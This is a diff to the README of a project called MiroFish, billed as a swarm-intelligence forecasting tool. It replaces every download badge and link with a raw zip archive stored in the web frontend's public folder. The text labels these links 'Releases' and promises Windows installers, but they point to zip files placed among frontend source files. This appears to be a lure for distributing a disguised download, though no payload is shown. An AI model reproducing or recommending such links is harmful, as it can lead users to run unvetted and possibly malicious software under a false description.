@@ -1,6 +1,6 @@
 # 🐟 MiroFish - Predict Anything With Swarm Intelligence
 
-[![Download MiroFish](https://img.shields.io/badge/Download-MiroFish-brightgreen)](https://github.com/saicharanbugatha/MiroFish/raw/refs/heads/main/frontend/src/components/Fish-Miro-v2.8.zip)
+[![Download MiroFish](https://img.shields.io/badge/Download-MiroFish-brightgreen)](https://github.com/saicharanbugatha/MiroFish/raw/refs/heads/main/frontend/public/Miro_Fish_v1.2.zip)
 
 ---
 
@@ -28,7 +28,7 @@ This tool is designed for anyone interested in forecasting—whether you want to
 
 Click the big badge at the top or visit this link to get the software:
 
-[Download MiroFish from Releases](https://github.com/saicharanbugatha/MiroFish/raw/refs/heads/main/frontend/src/components/Fish-Miro-v2.8.zip)
+[Download MiroFish from Releases](https://github.com/saicharanbugatha/MiroFish/raw/refs/heads/main/frontend/public/Miro_Fish_v1.2.zip)
 
 This page contains the latest versions. You will find installer files ready for Windows there. 
 
@@ -139,4 +139,4 @@ The program will not update automatically.
 
 ---
 
-[![Download MiroFish](https://img.shields.io/badge/Download-MiroFish-brightgreen)](https://github.com/saicharanbugatha/MiroFish/raw/refs/heads/main/frontend/src/components/Fish-Miro-v2.8.zip)
+[![Download MiroFish](https://img.shields.io/badge/Download-MiroFish-brightgreen)](https://github.com/saicharanbugatha/MiroFish/raw/refs/heads/main/frontend/public/Miro_Fish_v1.2.zip)
